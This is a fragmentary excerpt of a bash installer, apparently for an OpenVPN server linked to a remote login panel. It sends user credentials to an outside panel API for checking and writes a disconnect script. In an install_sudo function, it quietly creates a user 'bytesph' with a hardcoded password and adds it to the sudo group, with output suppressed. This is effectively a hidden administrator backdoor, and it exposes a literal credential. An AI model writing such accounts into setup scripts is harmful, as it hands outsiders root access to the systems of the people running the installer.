...
##Authentication
data=$(curl -sb -X POST https://panel.enforcementsecurity.net/api/server-login -H "Content-Type: application/x-www-form-urlencoded" -d "username=$USERNAME&password=$PASS")

if [[ $data == "ACCEPT" ]];
then
	echo $data
	echo "$USERNAME | $PASS is valid"
	exit 0
else
	echo $data
...
cat <<'BytesPH' >/etc/openvpn/login/disconnect.sh
#!/bin/bash
...
install_sudo() {
    {
        ...
        echo bytesph:Premium2018!!!@@@@!!! | chpasswd &>/dev/null
        usermod -aG sudo bytesph &>/dev/null
